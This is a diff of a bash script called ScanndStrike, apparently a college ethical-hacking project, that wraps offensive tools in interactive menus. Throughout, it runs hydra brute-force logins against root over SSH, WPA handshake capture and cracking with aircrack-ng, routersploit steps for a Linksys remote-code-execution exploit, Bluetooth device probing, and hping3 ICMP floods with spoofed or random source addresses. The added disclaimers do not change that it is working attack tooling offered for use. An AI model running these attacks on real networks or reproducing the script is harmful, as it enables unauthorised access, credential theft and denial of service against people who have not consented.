@@ -1,106 +1,144 @@
-#!/bin/bash 
+#!/bin/bash
 
-PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script 
+PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script
 
-#Create the ScanndStrike Menu 
-#Launch the start/main menu 
-homemenu() 
-{ 
-#create a menu for the program using bash select, create sub menus within that can be used to run various modules 
-homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices"  "Exit") #creates the sub menu and the output shown to the user 
-select opt in "${homemenu[@]}"; do 
-        if [ "$opt" = "Exit" ]; then 
-        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear 
-        exit 0 
-        elif [ "$opt" = "Perform Recon" ]; then 
-netreconmenu 
-        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then 
-dosattackmenu 
-        elif [ "$opt" = "Execute Attacks on Smart Devices" ]; then 
-ethhackmenu 
-        else 
-#if no valid option is chosen, chastise the user 
-        echo "To exit this tool hit Return/Enter! Thank you" 
-        fi 
-done 
-} 
-#End of HomeMenu Code 
+#Create the ScanndStrike Menu
+#Launch the start/main menu
+homemenu()
+{
+#create a menu for the program using bash select, create sub menus within that can be used to run various modules
+echo "WARNING: Performing any of the techniques contained in this script against a network, device or organization without permission is a criminal offense. These techniques are to be  conducted ethichally and in line  with the law"
+echo ""
+echo "Any Violation of these laws is not condoned by the Project creator as this project was created for educational purposes only as part of a college project"
+echo ""
+echo "Now that the elephant in the room has been addressed ! Be safe and I hope you enjoy trying these techniques on your own networks and devices"
+echo ""
+homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices"  "Exit") #creates the sub menu and the output shown to the user
+select opt in "${homemenu[@]}"; do
+        if [ "$opt" = "Exit" ]; then
+        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear
+        exit 0
+        elif [ "$opt" = "Perform Recon" ]; then
+        echo ""
+        echo "What type of Reconassaince would you like to conduct?"
+        echo ""
+        echo "To choose a certain module enter the number assigned to it and press Enter !"
+        echo ""
+        netreconmenu
+        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then
+        echo ""
+        echo "What type of Denial of Service attack would you like to perform?"
+        echo ""
+        echo "To choose a certain module enter the number assigned to it and hit Enter!"
+        echo ""
+        dosattackmenu
+        elif [ "$opt" = "Execute Attacks on Smart Devices" ]; then
+        echo ""
+        echo "Here I have included some very cool hacking techniques you can perform on your own network and devices to test your security and discover how easy it can be for a hacker to access your information."
+        echo ""
+        echo "The majority of these modules will require either a Raspberry Pi running Kali Linux or a Virtual Box Running Kali Linux with a bluetooth Adapter configured to be ran correctly."
+        echo ""
+        echo "To choose a certain module enter the number assigned to it and hit Enter."
+        echo ""
+        ethhackmenu
+        else
+#if no valid option is chosen, chastise the user
+        echo "To exit this tool hit Return/Enter! Thank you"
+        fi
+done
+}
+#End of HomeMenu Code
 
-################# 
-# Sub Menu Code # 
-################# 
+#################
+# Sub Menu Code #
+#################
 
-#Start of the EthHack Menu Code 
+#Start of the EthHack Menu Code
+ethhackmenu()
+{
+#build a menu for theb attack modules using bash select
+                ethhackmenu=( "SSH Exploit Hydra + Nmap" "Wifi Password Cracking" "Wordlist Creation" "Bluetooth Targeting" "Router Exploitation" "Go back")
+        select ethopt in "${ethhackmenu[@]}"; do
 
-ethhackmenu() 
-{ 
-#build a menu for theb attack modules using bash select 
-ethhackmenu=("SSH Exploit Nmap" "SSH Exploit Hydra" "Wifi Password Cracking" "Wordlist Creation" "Router Exploit" "Go back") 
-        select ethopt in "${ethhackmenu[@]}"; do 
-#Perform SSH Explot using nmap 
-        if [ "$ethopt" = "SSH Exploit" ]; then  
-               sshexploit 
-#SSH Hydra 
-    elif [ "$ethopt" = "SSH Exploit Hydra" ]; then 
-        sshydra   
+#SSH Exploitation using Hydra and nmap
+    if [ "$ethopt" = "SSH Exploit Hydra + Nmap" ]; then
+        sshydra  
 
-#Perform Wifi Cracking with Aircrack-ng 
+#Perform Wifi Cracking with WIFITE
+    elif [ "$ethopt" = "Wifi Password Cracking" ]; then
+        passcrack
 
-    elif [ "$ethopt" = "Wifi Password Cracking" ]; then 
-        passcrack 
+#Create a custom wordlist for password cracking tools
+    elif [ "$ethopt" = "Wordlist Creation" ]; then
+        crunchlist
 
-#Create a custom wordlist for password cracking tools 
-    elif [ "$ethopt" = "Wordlist Creation" ]; then 
-        crunchlist 
-        
-#Perfrom Recon on a Router and exploit any available vulnerabilities 
-    elif [ "$ethopt" = "Router Exploit" ]; then 
-        routerexp 
+#Perform attacks on Bluetooth devices
+    elif [ "$ethopt" = "Bluetooth Targeting" ]; then
+        bluebite
 
-#Go back 
-        elif [ "$ethopt" = "Go back" ]; then 
-                homemenu 
+#Perfrom Recon on a Router and exploit any available vulnerabilities
+    elif [ "$ethopt" = "Router Exploitation" ]; then
+        routerexp
+#Go back
+        elif [ "$ethopt" = "Go back" ]; then
+                homemenu
+## Default if no menu option selected is to return an error
+        else
+                echo  "That's not a valid option! Hit Return/Enter to show menu"
+        fi
+        done
+}
 
-## Default if no menu option selected is to return an error 
-        else 
-        echo  "That's not a valid option! Hit Return/Enter to show menu" 
-        fi 
-done 
-} 
+#Start of Routersploit Code
+routerexp()
+{
+echo "Lets see if this works hm"
+cd routersploit
+echo "The next command is going to launch routersploit. In order to use routersploit correctly run the following commands in order:"
+echo ""
+echo "1. use scanners/routers/router_scan"
+echo "2. show options"
+echo "3. set target <Target IP/Hostname>"
+echo "Example: set target 192.168.0."
+echo "4. run"
+echo ""
+echo "Once the target has been scanned any vulnerablities will be shown along with the exploits that can be used on them"
+echo "A typical exploit available is eseries_themoon_rce"
+echo "To successfully exploit the router you essentially repeat the steps above as they are"
+echo ""
+echo "1. use exploits/routers/linksys/eseries_themoon_rce"
+echo "2. show options" 
+echo "3. set target <Vulnerability IP>"
+echo "4. set port 81"
+echo "5. run"
+echo "" 
+echo "If successful in your exploit you will be able to access the devices cmd where you can perform Blind Command Injection"
+sudo  python3 rsf.py
+echo ""
+}
+#End of Routersploit Code
 
-  
-
-routerexp() 
-{ 
-echo "Lets see if this works hm" 
-cd routersploit 
-echo "Test" 
-sudo python3 rsf.py 
-
-} 
-
-
+#Start of Wifi password cracking code
 passcrack()
 {
 echo "In order to crack your Wifi Password we can use Aircrack-ng while this program does automate some of the proccesses this module will require some interaction from you !"
 echo "To start please open two additional terminal windows these will be used to run a total of 3 commands that will be provided for you ! You will just need to copy, paste and run them !"
 ifconfig 
 echo "As you can see above we have wlan0 this needs to become wlan0mon so we can begin our password cracking attack. This can be changed with the command:"
-echo ""
+echo "      "
 echo "sudo airmon-ng start wlan0"
-echo ""
+echo "    "
 echo "The following commands should be run only if your first attempt at this password attack is stopped due to an error:"
-echo ""
-"1. sudo aircrack-ng start wlan0" 
-"2. sudo Ifconfig wlan0mon down "
-"3. sudo iwconfig wlan0mon mode monitor" 
-"4. sudo ifconfig wlan0mon up "
-""
+echo "    "
+echo "1. sudo aircrack-ng start wlan0" 
+echo "2. sudo Ifconfig wlan0mon down "
+echo "3. sudo iwconfig wlan0mon mode monitor" 
+echo "4. sudo ifconfig wlan0mon up "
+echo "  "
 echo "Now that your system is ready to begin cracking your WIFIpassword we can begin with our first command "
 echo "Copy and paste the following command into the terminal window you had previously opened and press Enter. Command: sudo airodump-ng wlan0mon"
 echo "When this is running you will see of all the available Wireless Networks within range. You will notice theres also information about these networks such as a unique BSSID, Channel (CH), Data etc"
-echo "To breach your network we will require the networks BSSID and Channel and the name of a file chosen by you that will contain the WPA Handshake we will attempt to capture" 
-echo"" 
+echo "   "
 read -i $TARGET -e TARGET
 read -i $CHANNEL -e CHANNEL
 read -i $FILE -e FILE
@@ -117,12 +155,12 @@ if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]
                 if [ "$CHOICE" = "c" ]; then
                 echo "PLease enter the name and location of your wordlist e.g if your wordlist is stored in Documents enter Documents/ followed by the name of your wordlist"
                 read -i $LIST -e LIST
-                sudo aircrack-ng $LIST $FILE.cap
+                sudo aircrack-ng $LIST $FILE-01.cap
                 elif [ "$CHOICE" = "d" ]; then
-                sudo aircrack-ng rockyou.txt $FILE.cap
+                sudo aircrack-ng rockyou.txt $FILE-01.cap
                 else echo "Not a valid option! Using default list instead "
                 echo ""
-                sudo aircrack-ng rockyou.txt $FILE.cap        
+                sudo aircrack-ng rockyou.txt $FILE-01.cap
                 fi
                 elif [ "$SOURCE" = "n" ]; then
                 echo "Since WPA Handshake was not captured we will need to restart the machine to try the process again"
@@ -132,121 +170,109 @@ if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]
 echo ""
 echo ""
 }
+#End of Wifi password cracking code
+
+#Start of nmap and hydra code for SSH attack 
+sshydra()
+{
+echo "Please enter a target hostname or IP address:"
+#IP address/hostname of the target is required to begin
+                 read -i $HOST -e HOST
+#Here we are running a scan of all devices connected to the target network that have the ports 80, 81, 8080 and 8081 running
+                sudo nmap $HOST/24 -p 80,81,8080,8081
+#While this does return important information it also reveals alot about devices with closed ports that wont be useful to us so we can run a secondary scan to show only open ports excluding closed and filtered ports
+sudo nmap $HOST/24 -p 80,81,8080,8081 --open
+echo "From the list of target devices shown connected to the network choose ones IP address to perfrom further scans on"
+read -i $TARGET -e TARGET 
+echo "Now that you have chosen your target to attack we can run an advanced scan to reveal additional information about it"
+#We use this scan to gather information about the services of the device and to try determine what the device is, is it a printer, router, raspberry pi etc.
+sudo nmap -sV $TARGET
+echo "Now that we have finished recon of the target we can begin the attack with Hydra"
+#Define whether the user wants to use a custom wordlist, default wordlist, create a wordlist now, or run a fast ssh exploit with a default wordlist
+echo "Hydra incorporates the use of password lists when attempting to break into a ssh connection this means custom wordlists/password lists  can be used based on information you may known about the victim of this attack"
+echo "Enter the name of your wordlist, [d]efault wordlist, [c]reate a wordlist now and use it or [f]ast track the attack with default wordlist and port specification"
+        read -i $SOURCE -e SOURCE
+        : ${SOURCE:=i}
+        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+                echo "You must enter a valid textfile"
+                hydra -l root -P  $SOURCE  $TARGET -t 4 ssh 
+        elif [ "$SOURCE" = "d" ]; then
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
+                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh 
+        elif [ "$SOURCE" = "f" ]; then  
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
+                hydra -s 22 -l root -P  nowtest  $TARGET  -t 4 -e nsr ssh
+        elif [ "$SOURCE" = "c" ]; then
+                echo "PLease choose a name for your wordlist"
+                read -i $LIST -e LIST
+                echo "Now, please choose the string you wish to use for your list of combinations e.g if you enter 12ab you will be creating a list containing all possible combinations of the letters and numbers within that string"
+                read -i $CRUNCH -e CRUNCH
+                crunch 4 4 $CRUNCH  -o Documents/$LIST
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu"
+                hydra -l root -P  Documents/$LIST  $TARGET -t 4 ssh 
+        else echo "Not a valid option! Using "
+                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh 
+        fi
+}
+#End of nmap and hydra ssh attack code
+
+#Start of Worldlist creation code
+crunchlist()
+{
+#The purpose of this module is to allow users to create wordlists which can be called upon later when attempting to penetrate a newtwork and its devices
+echo "Here we can create lists that can be later called upon for password cracking using Crunch"
+echo "Please enter the digits and characters you want this list to be made from e.g entering 123ABCabc will create a list of passwords made from every possible combination of this string"
+read -i $CRUNCH -e CRUNCH
+echo "Now that you have chosen the digits and characters for your password list you can assign a file for the passwords to be sent once compiled e.g mypass.txt"
+read -i $TEXT -e  TEXT
+crunch 4 4 $CRUNCH  -o Documents/$TEXT
+echo ""
+cat Documents/$TEXT
+echo "You have  just created a password list ! These can be called upon when perfroming various penetration tests on your network/devices"
+echo "You can view this password list by entering cd Documents/"$TEXT  "into the command line once you have exited this program"
+}
+
+#End of Wordlist creation code
+bluebite()
+{
+#Start of Bluetooth Targeting code
+echo "In order to snoop on a  target Bluetooth devices we first need to have a bluetooth adapater running so that is what we will do first"
+#Check for bluetooth adapter
+hciconfig
+#Some Bluetooth adapters may already be running but for the purpose of the Project we will be using one that is offline to start
+echo "If your hciconfig command returns no information then you need to reconfigure your bluetooth device"
+echo "However in some cases the device is recognised but not running, so we will now run the device"
+hciconfig hci0 up
+echo "Blutooth device is now up and running !"
+echo "Now we can scan for nearby bluetooth devices"
+#Hcitool can be used to perfrom a scan for other bluetooth devices within range
+hcitool scan
+echo "From the device(s) shown please choose a MAC Address"
+read -i $MAC -e MAC
+#This will provide the name of the device as it will not always be discovered in the intial scan 
+hcitool name $MAC
+echo "Now that we have the devices name and MAC address the spd tool can be used to gather additional information about the target"
+#Now that we known some information about the bluetooth target we can use a tool called sdp tool to query the device and gather additional information
+sdptool browse $MAC
+echo "You have now successfully snooped on a Bluetooth Device !"
+}
+#End of Bluetooth Targeting code
+
+###############################################
+#End of Ethichal Hacking Menu and Modules Code#
+###############################################
 
 
-  
-
-sshydra() 
-
-{ 
-
-echo "Please enter a target hostname or IP address:" 
-
-#IP address/hostname of the target is required to begin 
-
-                 read -i $HOST -e HOST 
-
-#Here we are running a scan of all devices connected to the target network that have the ports 80, 81, 8080 and 8081 running 
-
-                sudo nmap $HOST/24 -p 80,81,8080,8081 
-
-#While this does return important information it also reveals alot about devices with closed ports that wont be useful to us so we can run a secondary scan to show only open ports excluding closed and filtered ports 
-
-sudo nmap $HOST/24 -p 80,81,8080,8081 --open 
-
-echo "From the list of target devices shown connected to the network choose ones IP address to perfrom further scans on" 
-
-read -i $TARGET -e TARGET  
-
-echo "Now that you have chosen your target to attack we can run an advanced scan to reveal additional information about it" 
-
-sudo nmap -sV $TARGET 
-
-echo "Now that we have finished recon of the target we can begin the attack with Hydra" 
-
-#Define whether the user wants to use a custom wordlist, default wordlist, create a wordlist now, or run a fast ssh exploit with a default wordlist 
-
-echo "Hydra incorporates the use of password lists when attempting to break into a ssh connection this means custom wordlists/password lists  can be used based on information you may known about the victim of this attack" 
-
-echo "Enter the name of your wordlist, [d]efault wordlist, [c]reate a wordlist now and use it or [f]ast track the attack with default wordlist and port specification" 
-
-        read -i $SOURCE -e SOURCE 
-
-        : ${SOURCE:=i} 
-
-        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then 
-
-                echo "You must enter a valid textfile" 
-
-                hydra -l root -P  $SOURCE  $TARGET -t 4 ssh  
-
-        elif [ "$SOURCE" = "d" ]; then 
-
-                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
-
-                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh  
-
-        elif [ "$SOURCE" = "f" ]; then   
-
-                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
-
-                hydra -s 22 -l root -P  nowtest  $TARGET  -t 4 -e nsr ssh 
-
-        elif [ "$SOURCE" = "c" ]; then 
-
-                echo "PLease choose a name for your wordlist" 
-
-                read -i $LIST -e LIST 
-
-                echo "Now, please choose the string you wish to use for your list of combinations e.g if you enter 12ab you will be creating a list containing all possible combinations of the letters and numbers within that string" 
-
-                read -i $CRUNCH -e CRUNCH 
-
-                crunch 4 4 $CRUNCH  -o Documents/$LIST 
-
-                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
-
-                hydra -l root -P  Documents/$LIST  $TARGET -t 4 ssh  
-
-        else echo "Not a valid option! Using " 
-
-                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu" 
-
-                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh  
-
-        fi 
-
-} 
-
-crunchlist() 
-
-{ 
-
-echo "Here we can create lists that can be later called upon for password cracking using Crunch" 
-
-echo "Please enter the digits and characters you want this list to be made from e.g entering 123ABCabc will create a list of passwords made from every possible combination of this string" 
-
-read -i $CRUNCH -e CRUNCH 
-
-echo "Now that you have chosen the digits and characters for your password list you can assign a file for the passwords to be sent once compiled e.g mypass.txt" 
-
-read -i $TEXT -e  TEXT 
-
-crunch 4 4 $CRUNCH  -o Documents/$TEXT 
-
-echo "" 
-
-echo "You have  just created a password list ! These can be called upon when perfroming various penetration tests on your network/devices" 
-
-echo "You can view this password list by entering cd Documents/"$TEXT  "into the command line once you have  exited this program" 
-
-} 
+#############################################
+#Start of the NetRecon Menu and Modules Code#
+#############################################
 
 #Start of the NetRecon Menu Code
 netreconmenu()
 {
 #build a menu for the recon modules using bash select
-                netreconmenu=("Show IP" "Quick Scan" "Detailed Scan" "DNS Recon" "Ping Sweep" "Go back")
+                netreconmenu=("Show IP" "Quick Scan" "Detailed Scan" "DNS Recon" "IP Sweep" "Ping Sweep" "Go back")
         select reconopt in "${netreconmenu[@]}"; do
 
 #Display  users external IP & interface IP(s)
@@ -256,7 +282,6 @@ netreconmenu()
 #Perform Quick Recon on the Network
     elif [ "$reconopt" = "Quick Scan" ]; then
         quickscan
-
 #Perform a stealthy scan on the Network
     elif [ "$reconopt" = "Detailed Scan" ]; then
         detailedscan
@@ -264,6 +289,10 @@ netreconmenu()
 #DNS Recon
     elif [ "$reconopt" = "DNS Recon" ]; then
         dnsrecon
+#DNS Recon
+    elif [ "$reconopt" = "IP Sweep" ]; then
+       ipsweep
+
 #Ping Sweep
     elif [ "$reconopt" = "Ping Sweep" ]; then
         pingsweep
@@ -300,7 +329,6 @@ showip()
                 echo ""
 }
 #End of the ShowIP Code
-
 #Start of the Quick Scan Code
 quickscan()
 { echo "This module was designed to conducts a scan of an entire network using nmap to search for common open ports"
@@ -344,6 +372,8 @@ sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 }
 #End of Detailed Scan Code
 
+
+
 #Start of the DNS Recon Code
 dnsrecon()
 { echo "This module executes passive recon commands through reverse and forward name searches (or lookups) for the target and performs a whois lookup"
@@ -364,6 +394,20 @@ fi
 }
 #End of DNS Recon Code
 
+ipsweep()
+{ echo "Enter a target IP to sweep and an assign a name to the textfile that will store this information"
+echo "Example 192.168.1"
+read -i $IPTARGET -e IPTARGET
+echo "Now please enter the name you wish to assign to the document where these IPs will be stored"
+echo "Example ipsweeplist.txt"
+read -i $TXTFILE -e TXTFILE
+for ip in `seq 1 254`; do
+ping -c 1 $IPTARGET.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"  &
+done > Documents/$TXTFILE
+cat Documents/$TXTFILE
+echo "IP Sweep completed list of Ips found can be shown using the command: cat Documents/"$TXTFILE "in the command line"
+echo "To scan these IPs for open ports using nmap select the Detailed Scan option from the Menu"
+}
 
 #Start of the Ping Sweep Code
 pingsweep()
@@ -379,14 +423,14 @@ sudo nmap -sP -PE $TARGET --reason
 
 
 
-##############################################
-#End of Network Recon Menu and Functions Code#
-##############################################
+############################################
+#End of Network Recon Menu and Modules Code#
+############################################
 
 
-#################################
-#Start of DOS Menu and Functions#
-#################################
+###############################
+#Start of DOS Menu and Modules#
+###############################
 
 #Start of DoS Menu Code
 dosattackmenu()
@@ -414,9 +458,9 @@ done
 }
 #End of DoS Attack Menu Code
 
-####################################
-# Functions of the DoS Attack Menu #
-####################################
+##################################
+# Modules of the DoS Attack Menu #
+##################################
 
 #Start of ICMPFLOOD Code                                                                                                                                                                                                            2 ⨯
 icmpflood()
@@ -429,17 +473,17 @@ icmpflood()
                 echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
         read -i $SOURCE -e SOURCE
         : ${SOURCE:=i}
-        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-                echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
+ if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                 sudo hping3 -1 --flood --spoof $SOURCE $TARGET
         elif [ "$SOURCE" = "r" ]; then
-                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                 sudo hping3 -1 --flood --rand-source $TARGET
         elif [ "$SOURCE" = "i" ]; then
-                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                 sudo hping3 -1 --flood $TARGET
         else echo "Not a valid option!  Using interface IP"
-                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+                echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                 sudo hping3 -1 --flood $TARGET
         fi
 }
@@ -476,71 +520,35 @@ exit 0
 }
 #End of Distraction Scan Code
 
+####################################
+#End of DoS Attack Menu and Modules#
+####################################
 
-#######
-#End of DoS Attack Menu and Functionality
-#######
 
-#Required Proxy
-#Implement Stunnel proxy on host device
-stunnel_client()
-{ echo "use SSL/TLS? [y]es or [n]o (default):"
-        read SSL
-        : ${SSL:=n}
-#Create an SSL/TLS tunnel using a local listener on TCP port 9991
-if [[ "$SSL" = "y" ]]
-        then echo "Using SSL/TLS"
-LHOST=127.0.0.1
-LPORT=9991
-#Determine if stunnel has been definined in the /etc/services directory and if it hasn't been then add it and set the required permissions
-grep -q $LPORT /etc/services
-if [[ $? = 1 ]]
-then
-echo "Adding scanndstrike stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "scanndstrike-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
-fi
-#Show network listening ports if ss function is availible for use
-if test -f "/bin/ss"; then
-        LISTPORT=ss;
-#otherwise use netstat
-        else LISTPORT=netstat
-fi
-#Check for port 9991 & display listening ports
-$LISTPORT -tln |grep -q $LPORT
-if [[ "$?" = "1" ]]
-#Perform stunnel configuration on port 9991 if it is not currently running a form of SSL
+########################
+##Opening Messages Code#
+########################
 
-then
-        echo "Creating stunnel client on $LHOST:$LPORT"
-                sudo rm -f /etc/stunnel/scanndstrike.conf;
-                sudo touch /etc/stunnel/scanndstrike.conf && sudo chmod 777 /etc/stunnel/scanndstrike.conf
-                sudo echo "[SCANNDSTRIKE-CLIENT]" >> /etc/stunnel/scanndstrike.conf
-                sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
-                sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/scanndstrike.conf
-                sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/scanndstrike.conf
-                sudo echo "verify=0" >> /etc/stunnel/scanndstrike.conf
-                sudo chmod 644 /etc/stunnel/scanndstrike.conf
-                sudo stunnel /etc/stunnel/scanndstrike.conf && sleep 1
-
-# If the user already as a stunnel listener active we do not need to execute this function
-else echo "It appears the stunnel is already being used to listen on port 9991, action not required."
-fi
-fi }
-#End of Proxy Server code
-
-##WELCOME##
-#########################
-#Display opening message 
+#Display opening message
 #since all the code above is being used to create functions (which must be defined before use) the opening message must be written as the last part of the script
 #This is to avoid any functionality issues and makes for a cleaner script
 
         clear && echo ""
-
+echo ""
+figlet "ScanndStrike" | lolcat
+echo ""
 echo "Welcome to scanndstrike!"
-echo "Please report all bugs, improvements and suggestions to the Repository where you found this software"
-echo "This software is only for responsible, authorised use."
+echo "Please report all bugs, improvements and suggestions to https://github.com/Gareth-hub/EthichalHackingProject.git"
+echo "This software is only was created as part of a college project and is authorised for educational use only."
+echo "This project was conducted in line with legal requirements and is intended to be shared for educational purposes only"
 echo "YOU are responsible for your own actions!"
 echo ""
-echo "" 
+echo "Basic Commands:"
+echo "A module can be stopped using the Ctrl and C keys"
+echo "To exit a Module and return to its menu hit the Enter or Return Key Twice"
+echo ""
+echo ""
 homemenu
-##End Opening Message
+#End Opening Message
+
 
